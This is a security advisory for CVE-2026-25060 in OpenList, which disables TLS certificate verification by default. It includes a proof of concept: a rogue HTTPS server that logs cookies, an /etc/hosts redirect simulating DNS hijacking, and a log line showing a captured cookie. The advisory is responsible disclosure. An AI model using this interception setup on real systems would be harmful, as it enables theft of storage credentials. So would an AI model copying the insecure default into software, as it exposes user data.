# OpenList has Insecure TLS Default Configuration

**GHSA**: GHSA-wf93-3ghh-h389 | **CVE**: CVE-2026-25060 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-599

**Affected Packages**:
- **github.com/OpenListTeam/OpenList/v4** (go): < 4.1.10

## Description

### Summary
The application disables TLS certificate verification by default for all outgoing storage driver communications, making the system vulnerable to Man-in-the-Middle (MitM) attacks. This enables the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.

### Details
Certificate verification is disabled by default for all storage driver communications.

The `TlsInsecureSkipVerify` setting is default to true in the `DefaultConfig()` function in [internal/conf/config.go](https://github.com/OpenListTeam/OpenList/blob/5db2172ed681346b69ed468c73c1f01b6ed455ea/internal/conf/config.go#L185).

~~~
func DefaultConfig() *Config {
    // ...
    TlsInsecureSkipVerify: true,
    // ...
}
~~~

This vulnerability enables Man-in-the-Middle (MitM) attacks by disabling TLS certificate verification, allowing attackers to intercept and manipulate all storage communications. Attackers can exploit this through network-level attacks like ARP spoofing, rogue Wi-Fi access points, or compromised internal network equipment to redirect traffic to malicious endpoints. Since certificate validation is skipped, the system will unknowingly establish encrypted connections with attacker-controlled servers, enabling full decryption, data theft, and manipulation of all storage operations without triggering any security warnings.

### PoC
We modified the /etc/hostsfile to simulate DNS hijacking and redirect [www.weiyun.com](http://www.weiyun.comto/) to a malicious TLS-enabled HTTP server.

The purpose of this PoC is to demonstrate that the Openlist server will indeed establish communication with a malicious server due to disabled certificate verification. This allows us to intercept and steal authentication cookies used for communicating with other storage providers.

#### Setup a malicious https server:
*ssl.conf*:
~~~
LoadModule ssl_module modules/mod_ssl.so
LoadModule log_config_module modules/mod_log_config.so

Listen 443

LogFormat "%h %l %u %t \"%r\" %>s %b Host:%{Host}i User-Agent:%{User-Agent}i Referer:%{Referer}i Accept:%{Accept}i Cookie:%{Cookie}i" headers
CustomLog "/usr/local/apache2/logs/headers.log" headers

<VirtualHost _default_:443>
    DocumentRoot "/usr/local/apache2/htdocs"
    ServerName localhost

    SSLEngine on
    SSLCertificateFile "/usr/local/apache2/conf/server.crt"
    SSLCertificateKeyFile "/usr/local/apache2/conf/server.key"

    ErrorLog "/usr/local/apache2/logs/ssl_error.log"

    <Directory "/usr/local/apache2/htdocs">
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
~~~

*Dockerfile*:
~~~
FROM httpd:2.4

# Copy SSL config
COPY ssl.conf /usr/local/apache2/conf/extra/ssl.conf

# Include SSL config in main httpd.conf
RUN echo "Include conf/extra/ssl.conf" >> /usr/local/apache2/conf/httpd.conf

# Copy certs
COPY certs/server.crt /usr/local/apache2/conf/server.crt
COPY certs/server.key /usr/local/apache2/conf/server.key
~~~

*build-ssh-httpd.sh*
~~~bash
mkdir certs
openssl req -x509 -nodes -days 365 \
  -newkey rsa:2048 \
  -keyout certs/server.key \
  -out certs/server.crt
docker build -t httpd-test-ssl .
~~~

*docker-compose.yaml*:
~~~
services:
  openlist:
    restart: always
    volumes:
      - '/etc/openlist:/opt/openlist/data'
    ports:
      - '5244:5244'
      - '5245:5245'
    user: '0:0'
    environment:
      - UMASK=022
      - TZ=Asia/Shanghai
    container_name: openlist
    image: 'openlistteam/openlist:latest'

  evilhttpd:
    image: 'httpd-test-ssl:latest'
~~~

#### Simulate DNS hijacking
Modify openlist container's /etc/hosts to redirect www.weiyun.com to malicious server:
~~~
<IP of HTTPS Server>      www.weiyun.com
~~~

You can `ping evilhttpd` to obtain its IP.

#### Trigger
In the front end, add a weiyun storage and inspect log on tls server:

~~~
root@3c5bbda440c9:/usr/local/apache2# tail -n 1  /usr/local/apache2/logs/headers.log
172.18.0.2 - - [18/Dec/2025:06:29:48 +0000] "POST /webapp/json/weiyunQdiskClient/DiskUserInfoGet?cmd=2201&g_tk= HTTP/1.1" 404 236 Host:www.weiyun.com User-Agent:Mozilla/5.0 (Macintosh; Apple macOS 15_5) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 Chrome/138.0.0.0 Referer:- Accept:- Cookie:test-secret-cookie=
~~~

Note that the cookie in the log.

### Impact
This misconfiguration allows attackers to perform man in the middle attack, which potentially leads to the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.

This vulnerability affects all openlist deployment with default TLS configuration.

### Note
Credit
This vulnerability was discovered by:
- XlabAI Team of Tencent Xuanwu Lab
- Atuin Automated Vulnerability Discovery Engine

CVE and credit are preferred.

If you have any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is [xlabai@tencent.com](mailto:xlabai@tencent.com).

We follow the security industry standard [90+30 disclosure policy](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.
